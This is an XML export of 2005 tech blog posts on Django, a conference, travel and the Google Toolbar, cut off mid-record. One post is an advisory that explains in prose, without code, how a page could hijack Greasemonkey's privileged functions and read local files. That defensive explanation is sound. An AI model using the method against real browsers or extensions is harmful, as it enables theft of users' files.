		<field name="body">&lt;p&gt;I've been &lt;em&gt;very&lt;/em&gt; busy for the last three days. My last two exams (HCI and Marketing) were on Thursday evening and Friday morning respectively, followed by a celebratory barbecue. I was up at 7am on Saturday to get up to Wolverhampton for &lt;a href=&quot;http://www.lugradio.org/live/2005/&quot;&gt;LUG Radio Live&lt;/a&gt;, then back to Bath again by 5.30pm for our graduation summer ball. Finally, I'm heading off to Denmark in the early hours of Monday morning for a week and a bit of camping and &lt;a href=&quot;http://en.wikipedia.org/wiki/Roskilde_Festival&quot;&gt;Roskilde&lt;/a&gt; Let's hope it's a bit drier than &lt;a href=&quot;http://www.flickr.com/photos/paulhammond/21499496/&quot; title=&quot;Sharks!&quot;&gt;Glastonbury was&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-0&quot;&gt;LUG Radio Live was a huge success. I have no idea how many people showed up, but it was at least several hundred. I did a lightning talk on Greasemonkey (&lt;a href=&quot;http://simon.incutio.com/slides/2005/lugradio/&quot; title=&quot;Hacking the web with Greasemonkey&quot;&gt;slides here&lt;/a&gt;) which seemed to go pretty well, and ended in a lively Q&amp;amp;A session. I've posted &lt;a href=&quot;http://www.flickr.com/photos/simon/sets/503809/&quot; title=&quot;Photo Set: LUG Radio Live 2005&quot;&gt;some of my photos&lt;/a&gt; from the event up on Flickr.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Mark Shuttleworth seamlessly combined a talk on Ubuntu, the importance of open source, collaborative development tools and what it's like to go in to space. He's a great speaker, and I thoroughly recommend seeing him talk if you ever get a chance. He also mentioned that he would be interesting in sponsoring a bounty towards the development of an open-source SubEthaEdit clone.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;The LUG Radio team interviewed Ian Bell, the author of the original Elite. The most interesting revelation was that fitting the compiled Elite game in to 32K was actually easier than getting the uncompiled source code small enough to fit on the hosting architecture (they had to strip out all of the comments).&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;I met a bunch of interesting people and had a great time, even though I had to leave early to get back in time for the ball. Congratulations to all involved, and I look forward to going again next year.&lt;/p&gt;</field>
		<field name="created">2005-06-26 18:33:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1494</field>
		<field name="title">London</field>
		<field name="slug">london</field>
		<field name="body">&lt;p&gt;My heart goes out to all those affected by yesterday's terrible attack on London. I think it's safe to say that here in Britain we are shaken but not stirred - the response here from both the emergency services and the Great British Public has been inspiring. To my knowledge, my friends and relatives are all safe. Thanks to all who asked after me.&lt;/p&gt;

&lt;p&gt;For good overall coverage of major news events, you still can't do better than &lt;a href=&quot;http://en.wikipedia.org/wiki/2005_London_transport_explosions&quot; title=&quot;7 July 2005 London bombings&quot;&gt;Wikipedia&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2005-07-08 08:59:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1495</field>
		<field name="title">Dissecting the Google Firefox Toolbar</field>
		<field name="slug">toolbar</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;Google have finally released a Firefox version of the &lt;a href=&quot;http://toolbar.google.com/&quot;&gt;Google Toolbar&lt;/a&gt;, with some nice &lt;a href=&quot;http://googleblog.blogspot.com/2005/07/platypus-of-internet.html&quot; title=&quot;The platypus of the Internet&quot;&gt;praise for XUL&lt;/a&gt; in to the bargain. Of course, the most interesting part of the toolbar from a geeky point of view is the bit that queries Google's servers for PageRank. Sure enough, if you download the &lt;code&gt;google-toolbar.xpi&lt;/code&gt; file, unzip it, then unzip the &lt;code&gt;google-toolbar.jar&lt;/code&gt; file within there's a file called &lt;code&gt;pagerank.js&lt;/code&gt; with all of the juicy details.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;To query PageRank, the toolbar makes a standard HTTP request to &lt;code&gt;toolbarqueries.google.com&lt;/code&gt;, with the page to query in a parameter along with a hash (presumably to discourage scraping). &lt;code&gt;pagerank.js&lt;/code&gt; includes the hash algorithm, with some amusing implementation details:&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;code class=&quot;javascript&quot;&gt;var GPR_HASH_SEED = &quot;Mining PageRank is AGAINST GOOGLE'S TERMS OF SERVICE. Yes, I'm talking to you, scammer.&quot;;&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;function GPR_awesomeHash(value) {
  var &lt;a href=&quot;http://www.imdb.com/title/tt0094012/quotes#qt0152593&quot; title=&quot;Spaceballs quotes&quot;&gt;kindOfThingAnIdiotWouldHaveOnHisLuggage&lt;/a&gt; = 16909125;
  ...
}&lt;/code&gt;&lt;/pre&gt;

&lt;p id=&quot;p-3&quot;&gt;The spell check feature (&lt;code&gt;spellcheck.js&lt;/code&gt;) is interesting as well. When you click the &quot;Check&quot; button, the toolbar packages any content in form fields up in XML and POSTs it to http://www.google.com/tbproxy/spell.  It get backs a simple XML document providing the offset, length and confidence for each spelling error along with a list of suggested alternatives. The user interface stuff is all handled by the extension.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;If you want to watch the toolbar in action, I recommend the fantastic &lt;a href=&quot;http://livehttpheaders.mozdev.org/&quot;&gt;LiveHTTPHeaders extension&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2005-07-08 10:10:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1496</field>
		<field name="title">Less code is more</field>
		<field name="slug">less</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I've pointed to it a couple of the times from the &lt;a href=&quot;http://simon.incutio.com/blogmarks/&quot;&gt;blogmarks&lt;/a&gt;, but it's worth re-iterating here: if you have any interest at all in LAMP, agile programming or open-source development methodologies you should take a look at &lt;a href=&quot;http://lesscode.org/&quot;&gt;lesscode.org&lt;/a&gt;. To quote their &lt;a href=&quot;http://lesscode.org/about/&quot;&gt;about page&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://lesscode.org/about/&quot;&gt;&lt;p id=&quot;p-1&quot;&gt;lesscode.org is a place to advocate, discuss, and practice the art of
using &lt;em&gt;less code&lt;/em&gt; to get &lt;em&gt;more done&lt;/em&gt;. We shun complexity and challenge
the status-quo when it impedes our ability to simplify our development
tools and processes. We appreciate 
&lt;a href=&quot;http://python.org/&quot;&gt;Python&lt;/a&gt;, &lt;a href=&quot;http://ruby-lang.org/&quot; title=&quot;Ruby: Programmer&amp;apos;s Best Friend&quot;&gt;Ruby&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/LAMP&quot; title=&quot;The LAMP Platform&quot;&gt;LAMP&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/REST&quot; title=&quot;Representationl State Transfer&quot;&gt;REST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/KISS_principle&quot; title=&quot;KISS principle&quot;&gt;KISS&lt;/a&gt;, &lt;a href=&quot;http://www.jwz.org/doc/worse-is-better.html&quot; title=&quot;Worse is better&quot;&gt;worse is
better&lt;/a&gt;, and &lt;a href=&quot;http://www.talklikeapirate.com/&quot; title=&quot;w00t!&quot;&gt;talk like a pirate day&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-2&quot;&gt;&lt;a href=&quot;http://naeblis.cx/rtomayko/&quot;&gt;Ryan Tomayko&lt;/a&gt; is the guy behind the site, and he evidently has a lot to get off his chest.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;In other recommendations, Ka-Ping Yee has been providing excellent coverage and analysis of &lt;a href=&quot;http://cups.cs.cmu.edu/soups/&quot; title=&quot;Symposium On Usable Privacy and Security&quot;&gt;SOUPS 2005&lt;/a&gt; over at &lt;a href=&quot;http://usablesecurity.com/2005/07/&quot; title=&quot;Usable Security archive for July 2005&quot;&gt;Usable Security&lt;/a&gt;. And on an unrelated note, I've been deriving a great deal of amusement from &lt;a href=&quot;http://iharthdarth.livejournal.com/&quot;&gt;I Harth Darth&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;I'm off to San Francisco for a week. Stay safe.&lt;/p&gt;</field>
		<field name="created">2005-07-10 02:53:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1497</field>
		<field name="title">Introducing Django</field>
		<field name="slug">django</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;You may know that I spent a year working in Kansas for a local newspaper - the &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;Lawrence Journal-World&lt;/a&gt;. I'm delighted to announce that a decent chunk of the software I worked on there is now available as open-source, in the form of the &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django web framework&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Django is an &lt;acronym title=&quot;Model View Controller&quot;&gt;MVC&lt;/acronym&gt; Python web development framework with a strong emphasis on content management. While comparisons with &lt;a href=&quot;http://www.rubyonrails.org/&quot;&gt;Rails&lt;/a&gt; are inevitable (I plan to post one myself shortly), it should be emphasized that Django is by no means a clone of Rails - in fact, development on Django started in October 2003, months before the first public Rails release. That the two frameworks share so many ideas is, I feel, a testament to the design of both.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Django was initially developed by &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian Holovaty&lt;/a&gt; and myself, with &lt;a href=&quot;http://www.jacobian.org/&quot;&gt;Jacob Kaplan-Moss&lt;/a&gt; joining the team shortly before my departure. The framework evolved during the construction of a number of sites, which included:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.6newslawrence.com/&quot;&gt;6newslawrence.com&lt;/a&gt;, local TV news, the first site to launch using the then nascent Django framework.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.lawrence.com/&quot;&gt;lawrence.com&lt;/a&gt;, a local entertainment site. Every town should have a site like this; sadly, very few do.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.visitlawrence.com/&quot;&gt;VisitLawrence.com&lt;/a&gt;, a local tourism site.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.kusports.com/&quot;&gt;KUSports.com&lt;/a&gt;, a sports news site covering the University of Kansas.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.ljworld.com/&quot;&gt;LJWorld.com&lt;/a&gt;, a local news site and the flagship for the Journal-World.&lt;/li&gt;
&lt;/ul&gt;

&lt;p id=&quot;p-3&quot;&gt;It's also purring along under the hood of &lt;a href=&quot;http://www.chicagocrime.org/&quot;&gt;chicagocrime.org&lt;/a&gt; and the &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django project site&lt;/a&gt; itself.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Adrian and I developed Django to allow us to create reasonably complex database driven web applications in as little time as possible. A local newspaper produces a huge amount of information - news stories, events listings, obituaries, sports results, marriage announcements, photo galleries, polls, weather reports and dozens of other bits and pieces. To maximise their value and potential for reuse, these things need to be stored in a database. That database needs a user interface for people to add and modify content, and of course the information needs to be published to a website somewhere.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Django automates most of this - and makes the rest as easy as possible. You create a &lt;em&gt;data description&lt;/em&gt; (kind of like an &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; table schema but with additional information about validation rules and interface widgets) and load it in to Django. Django then creates the database tables, model classes and a comprehensive web-based administration interface for your site's staff. All that's left for you to do manually is the code for the public site, which is generally a case of writing a few lines of controller code, configuring some &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s and knocking out some templates.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;To give you an idea of how much this speeds up the creation of new sites, consider the case of &lt;a href=&quot;http://www.ljworld.com/game/&quot;&gt;Game&lt;/a&gt;. Game was a site created to provide detailed coverage of little-league games in and around Lawrence (for non-Americans, little-league is baseball and softball for children aged around 5 to 11 - it's amazingly popular). The entire Game site, including news, fixtures, match results, team profiles and even weather forecasts for forthcoming matches took &lt;em&gt;two days&lt;/em&gt; to develop.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;I haven't been involved with Django since leaving the Journal-World back in September, but now that the framework is open-sourced I look forward to contributing to its further development - both in terms of documentation and actual code. There's already plenty to look at on the &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django site&lt;/a&gt; (designed by the ever-talented &lt;a href=&quot;http://www.wilsonminer.com/live/&quot;&gt;Wilson Miner&lt;/a&gt;); I suggest the &lt;a href=&quot;http://www.djangoproject.com/documentation/overview/&quot;&gt;overview&lt;/a&gt; as your first port of call.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;Expect to hear a lot more about the framework in the next few weeks.&lt;/p&gt;</field>
		<field name="created">2005-07-17 11:59:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1498</field>
		<field name="title">Understanding the Greasemonkey vulnerability</field>
		<field name="slug">vulnerability</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;If you have any version of Greasemonkey installed prior to 0.3.5, which was released a few hours ago, or if you are running any of the 0.4 alphas, you need to go and upgrade &lt;a href=&quot;http://greasemonkey.mozdev.org/&quot;&gt;right now&lt;/a&gt;. All versions of Greasemonkey aside from 0.3.5 contain a &lt;a href=&quot;http://mozdev.org/pipermail/greasemonkey/2005-July/004022.html&quot; title=&quot;Mark Pilgrim&amp;apos;s announcement of the vulnerability&quot;&gt;nasty security hole&lt;/a&gt;, which could enable malicious web sites to read any file from your hard drive without you knowing.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;Unfortunately, 0.3.5 disables all of the &lt;a href=&quot;http://diveintogreasemonkey.org/api/&quot;&gt;GM_ API functions&lt;/a&gt;, without which many of the more interesting user scripts out there simple won't work. This is a temporary measure - the &lt;code&gt;GM_&lt;/code&gt; functions should return in a later release, once the security problem with them has been resolved.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;I'm going to explain how the vulnerability works, because it illustrates a number of interesting concepts in both web application security and JavaScript.&lt;/p&gt;

&lt;h4&gt;Same-origin policy&lt;/h4&gt;

&lt;p id=&quot;p-3&quot;&gt;JavaScript has always enforced a &lt;em&gt;same-origin policy&lt;/em&gt; for scripts loaded over the internet. This originally applied to scripting between frames (and iframes): a script loaded from a certain domain is only allowed to access the DOM of other pages loaded from that same domain. The same restriction has been extended to &lt;code&gt;XMLHttpRequest&lt;/code&gt; - you are only allowed to make an &lt;code&gt;XMLHttpRequest&lt;/code&gt; call back to the domain from which the script was originally loaded.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;This policy exists to prevent cross-domain attacks. Say for example you work for a company with an intranet hidden behind the firewall, full of interesting proprietary information. Without the same-origin policy, malicious sites that you visit on the public internet would be able to read information from your intranet, using your browser as the middle-man.&lt;/p&gt;

&lt;h4&gt;GM_xmlhttpRequest&lt;/h4&gt;

&lt;p id=&quot;p-5&quot;&gt;The &lt;code&gt;GM_xmlhttpRequest&lt;/code&gt; API function does not have this restriction - it can load data from any domain. This enables a whole host of interesting user scripts - the most famous of which is probably &lt;a href=&quot;http://bookburro.org/&quot;&gt;Book Burro&lt;/a&gt;, which shows comparison prices from different online stores for the item you are currently looking at on Amazon, Barnes and Noble and more.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;Malicious user scripts could use this feature to steal information from your private intranet, but malicious user scripts could also do all manner of other nasty things - stealing your Hotmail password for example. This is why you should never install a user script from an untrusted source without first reviewing the code.&lt;/p&gt;

&lt;h4&gt;Restricting API functions to user scripts only&lt;/h4&gt;

&lt;p id=&quot;p-7&quot;&gt;To keep things safe then, it is essential that the &lt;code&gt;GM_&lt;/code&gt; family of API functions can only ever be used by user scripts, not by code running on pages that you have visited. By installing a user script you have declared it trustworthy - but visiting a web page does not carry that contract.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;The way the flawed versions of Greasemonkey do that now is simple: the &lt;code&gt;GM_&lt;/code&gt; functions are added to the JavaScript global object (which is the window object), the user scripts for the page are &quot;injected&quot; using dynamically created &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; elements, they run, then the &lt;code&gt;GM_&lt;/code&gt; functions are removed from the global object to prevent scripts on the page from accessing them. This works because Greasemonkey injection and execution happens just before the onload event is fired - which is when most well behaved scripts kick in.&lt;/p&gt;

&lt;h4&gt;Object.watch()&lt;/h4&gt;

&lt;p id=&quot;p-9&quot;&gt;Here's the clever part: JavaScript 1.5 defines a method of the Object class (which is inherited by all other JavaScript objects) called &lt;a href=&quot;http://developer-test.mozilla.org/en/docs/Core_JavaScript_1.5_Reference:Objects:Object:watch&quot;&gt;watch&lt;/a&gt;. Watch is extremely powerful: it lets you register some code to be executed when a property on some other object is assigned. This is the key to the Greasemonkey vulnerability - by watching the window object for the point at which Greasemonkey adds the API functions, a malicious script can use those functions at the moment they are attached.&lt;/p&gt;

&lt;h4&gt;The file:// protocol&lt;/h4&gt;

&lt;p id=&quot;p-10&quot;&gt;Here's the final piece of the puzzle: the &lt;code&gt;file://&lt;/code&gt; protocol in Firefox allows you to view files and directory listings in your browser. Unfortunately, it also allows the &lt;code&gt;GM_xmlhttpRequest&lt;/code&gt; function to do the same. It's not at all hard for a malicious script to use the function to load in files at a known location - or even load in directory listings (as HTML), parse them and use them to find all kinds of things scattered around your hard drive.&lt;/p&gt;

&lt;h4&gt;Solving the problem&lt;/h4&gt;

&lt;p id=&quot;p-11&quot;&gt;The principle problem then is the requirement for &quot;safe&quot; Greasemonkey API functions - that is, functions that can be used by the user scripts but &lt;em&gt;not&lt;/em&gt; by code running on a website. Aaron is looking in to this right now - it looks like the solution will require a minor change to be made to many existing scripts, but the trade-off in terms of security is more than worth it. The &lt;code&gt;GM_xmlhttpRequest&lt;/code&gt; function will also be modified to disallow &lt;code&gt;file://&lt;/code&gt; URLs.&lt;/p&gt;

&lt;p id=&quot;p-12&quot;&gt;Until then, 0.3.5 is the only safe version of Greasemonkey.&lt;/p&gt;</field>
		<field name="created">2005-07-20 03:09:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1499</field>
		<field name="title">Exciting developments with Django</field>
		<field name="slug">django</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;The amount of activity surrounding the &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django web framework&lt;/a&gt; since its not-quite release a few weeks ago is amazing. Adrian, Jacob and Wilson have been working over-time, with 395 check-ins to source control since the 13th of July. They've added &lt;a href=&quot;http://code.djangoproject.com/file/django/trunk/django/core/handlers/wsgi.py&quot;&gt;WSGI support&lt;/a&gt;, a &lt;a href=&quot;http://www.djangoproject.com/weblog/2005/jul/18/local_server/&quot;&gt;development web server&lt;/a&gt;, &lt;a href=&quot;http://www.djangoproject.com/weblog/2005/jul/29/model_examples/&quot;&gt;unit-tests&lt;/a&gt;, a &lt;a href=&quot;http://www.djangoproject.com/documentation/&quot;&gt;ton of documentation&lt;/a&gt;, &lt;a href=&quot;http://www.djangoproject.com/weblog/2005/jul/21/sqlite3/&quot;&gt;SQLite support&lt;/a&gt;, &lt;a href=&quot;http://code.djangoproject.com/changeset/384&quot;&gt;database introspection&lt;/a&gt; and dozens of other feature tweaks and bug fixes. Check out the &lt;a href=&quot;http://code.djangoproject.com/timeline&quot;&gt;project Timeline&lt;/a&gt; for an idea of just how frenetic things have been.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;The emerging &lt;a href=&quot;http://www.djangoproject.com/community/&quot;&gt;Django community&lt;/a&gt; has been kicking in as well. There's a significant community-led initiative to get &lt;a href=&quot;http://code.djangoproject.com/wiki/InterNationalization&quot;&gt;internationalisation&lt;/a&gt; and &lt;a href=&quot;http://code.djangoproject.com/wiki/Localization&quot;&gt;localisation&lt;/a&gt; going, and a wide number of unofficial tutorials have emerged to complement &lt;a href=&quot;http://www.djangoproject.com/documentation/tutorial1/&quot;&gt;the one on the site&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Here's where things get really interesting: changes at the Journal-World have kick-started the Django job market. Rob Curley, formally in charge of the World Company's web activities, recently &lt;a href=&quot;http://www.digitaledge.org/DigArtPage.cfm?AID=7083&quot;&gt;took up a new position&lt;/a&gt; at the &lt;a href=&quot;http://www.naplesnews.com/&quot;&gt;Naples Daily News&lt;/a&gt; in Florida. Rob &lt;a href=&quot;http://eric.themoritzfamily.com/?p=48&quot;&gt;just hired Eric Moritz&lt;/a&gt;, a regular on the #django IRC channel, to work on Django-powered projects there.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Meanwhile, Adrian Holovaty has &lt;a href=&quot;http://www.poynter.org/column.asp?id=31&amp;amp;aid=86489&quot;&gt;taken a new job&lt;/a&gt; at the &lt;a href=&quot;http://www.washingtonpost.com/&quot;&gt;Washington Post&lt;/a&gt; as &quot;Editor, Editorial Innovations&quot; - a role that is sure to involve some very innovative use of Django (Adrian built &lt;a href=&quot;http://chicagocrime.org/&quot;&gt;chicagocrime.org&lt;/a&gt;). Adrian's departure means that the Journal-World are &lt;a href=&quot;http://www.holovaty.com/blog/archive/2005/08/03/0202&quot;&gt;looking for a new developer&lt;/a&gt; - here's &lt;a href=&quot;http://simonwillison.net/2004/Jun/29/job/&quot; title=&quot;Fancy a job?&quot;&gt;why you should apply&lt;/a&gt;.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;One thing's for certain: we're going to see some very exciting Django-powered sites in the next few months.&lt;/p&gt;</field>
		<field name="created">2005-08-03 16:56:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1500</field>
		<field name="title">How Django processes a request</field>
		<field name="slug">request</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;I've decided to kick-start some architecture documentation for &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django&lt;/a&gt; by describing how the core request handling mechanism in Django works. I'm talking about the part of Django that takes a request from a browser and turns it in to a response - I won't be discussing the template system, object-relational mapper or automated admin interface, which are all separate components; in fact, you don't need to use any of those to build a Django application.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;When Django receives a request, the first thing it does is create an HttpRequest object (or subclass there-of) to represent that request. How this is done differs depending on the host environment, with different code depending on if Django is running under mod_python or WSGI (which enables hosting with CGI, Twisted and more). This HttpRequest object is the principle abstraction that enables Django to work under different hosting mechanisms.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Once the object has been created, Django performs &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; resolution. This is a process by which the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; specified in the request is used to select a view function to handle the creation of a response. A trivial Django application is simply one or more view functions and a configuration file that maps those functions to &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt;s.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;Having resolved the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; to a view, the view function is called with the request object as the first argument. Other keyword arguments may be passed as well depending on the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; configuration; see &lt;a href=&quot;http://www.djangoproject.com/documentation/url_dispatch/&quot; title=&quot;URL dispatcher&quot;&gt;the documentation&lt;/a&gt; for details.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;The view function is where the bulk of the work happens: it is here that database queries are made, templates loaded, HTML is generated and an HttpResponse object encapsulating the result is created. The view function returns this object, which is then passed back to the environment-specific code (mod_python or WSGI) which passes it back to the browser as an HTTP response.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;This is all pretty straightforward stuff - but I skipped a couple of important details: exceptions and middleware. The view function doesn't have to return an HttpResponse; it can raise an exception instead, the most common varieties being Http404 (for file-not-found) or Http500 (for server error). In development servers these exceptions will be formatted and sent back to the browser, while in production mode they will be silently logged and a &quot;friendly&quot; error message displayed.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;Middleware is even more interesting. Django provides three hooks in the above sequence where middleware classes can intervene, with the middleware classes to be used defined in the site's configuration file. This results in three types of middleware: request, view and response (although one middleware class can apply for more than one hook).&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;&lt;strong&gt;Request&lt;/strong&gt; middleware runs after the HttpRequest object has been created but before the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; resolver runs, allowing it to modify the request in some way or to return a response of its own before the rest of the application has a chance to run.&lt;/p&gt;

&lt;p id=&quot;p-8&quot;&gt;&lt;strong&gt;View&lt;/strong&gt; middleware is executed after the &lt;acronym title=&quot;Universal Republic of Love&quot;&gt;URL&lt;/acronym&gt; resolver has been used to identify the view but before the view itself runs. It is passed the view as a callback, allowing it to perform operations before and after the view has been executed. Alternatively, it can avoid running the view function at all.&lt;/p&gt;

&lt;p id=&quot;p-9&quot;&gt;&lt;strong&gt;Response&lt;/strong&gt; middleware is run right at the end, after a response has been created but before it is passed back to the client. It has the ability to make final modifications to the HttpResponse object; for example, it could remove unnecessary whitespace from HTML or apply gzip compression.&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;The bulk of the above code can be found in the &lt;code&gt;__call__&lt;/code&gt; method of the &lt;a href=&quot;http://code.djangoproject.com/file/django/trunk/django/core/handlers/modpython.py&quot;&gt;ModPythonHandler&lt;/a&gt; class and the &lt;code&gt;get_response&lt;/code&gt; method of the &lt;a href=&quot;http://code.djangoproject.com/file/django/trunk/django/core/handlers/base.py&quot;&gt;BaseHandler&lt;/a&gt; class. Example middleware classes can be found in the &lt;a href=&quot;http://code.djangoproject.com/browser/django/trunk/django/middleware/&quot;&gt;middleware directory&lt;/a&gt;. As Django is not yet at a 1.0 release, the above is all subject to potential &lt;del datetime=&quot;2005-08-16T19:01:00Z&quot;&gt;refactoring&lt;/del&gt; future change.&lt;/p&gt;</field>
		<field name="created">2005-08-15 17:55:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1501</field>
		<field name="title">Django and Rails London meetup</field>
		<field name="slug">meetup</field>
		<field name="body">&lt;p&gt;Here's a date for your diary: Sam Newman is arranging a meetup for Django and Rails enthusiasts (and anyone else with an interest) on Monday the 5th of September at 7pm in &lt;a href=&quot;http://www.london-eating.co.uk/2288.htm&quot;&gt;Smiths of Smithfield&lt;/a&gt;. If you want to attend, leave a comment on &lt;a href=&quot;http://www.magpiebrain.com/archives/2005/08/17/meetup&quot;&gt;Sam's entry&lt;/a&gt; to give an idea of numbers. I'm signed up - it should be a fun evening.&lt;/p&gt;</field>
		<field name="created">2005-08-18 17:11:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1502</field>
		<field name="title">Poland, Dvorak and Broadband woes</field>
		<field name="slug">poland</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;My recent silence can be attributed to a number of things. I've been having a terrible time trying to get a 'net connection sorted out in my new flat - I can't get cable, and it seems the local exchange can't handle ADSL yet either. Curses. I also just got back from a fantastic ten day holiday in Gdansk, Poland with Natalie, and I'm typing this with a Dvorak keyboard (well, a PowerBook covered in post-it note fragments).&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;I'm experimenting with Dvorak mainly because I heard that learning it requires living through several weeks of painfully slow typing. Having just finished University and not yet started work the last few weeks have been something of a golden opportunity in that regard. I'm not yet back up to my old typing speed but I'm no longer frustratingly slow, and the promises of a more logical layout are holding up. Having all of the vowels on the home row under my left hand is certainly more intuitive than QWERTY.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;Poland is a wonderful place to visit. It's very cheap (compared to England at least) but has great food, beautiful sights and a very welcoming culture. The phrase book proved essential as there were no guarantees that anyone would speak English.&lt;/p&gt;

&lt;p id=&quot;p-3&quot;&gt;We stayed in &lt;a href=&quot;http://en.wikipedia.org/wiki/Gdansk&quot;&gt;Gdansk&lt;/a&gt;, which was celebrating 25 years of the &lt;a href=&quot;http://en.wikipedia.org/wiki/Solidarity&quot;&gt;Solidarity&lt;/a&gt; trade union movement, which resulted in the collapse of communism in Poland. We went to a Jean Michel Jarre concert in the ship yard where the movement began (&lt;a href=&quot;http://www.flickr.com/photos/simon/sets/903467/&quot;&gt;pictures on Flickr&lt;/a&gt;). We also made day trips to &lt;a href=&quot;http://en.wikipedia.org/wiki/Hel%2C_Poland&quot;&gt;Hel&lt;/a&gt;, &lt;a href=&quot;http://www.mos.gov.pl/kzpn/en/slow_gb.htm&quot;&gt;Slowinski National Park&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/Torun&quot;&gt;Torun&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/Malbork&quot;&gt;Malbork&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/Sopot&quot;&gt;Sopot&lt;/a&gt;, and &lt;a href=&quot;http://en.wikipedia.org/wiki/Gdynia&quot;&gt;Gdynia&lt;/a&gt;. That's a whole lot more photos still to go up!&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Finally, I attended the Django and Rails meetup on Monday evening in London. There were about 20 people there from all sorts of backgrounds and it was great seeing how much interest there was in the two frameworks. Sam is already &lt;a href=&quot;http://www.magpiebrain.com/archives/2005/09/06/meetup&quot;&gt;planning the next one&lt;/a&gt; for October 10th. I'm looking forward to it.&lt;/p&gt;</field>
		<field name="created">2005-09-07 19:49:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1503</field>
		<field name="title">Change of e-mail address</field>
		<field name="slug">email</field>
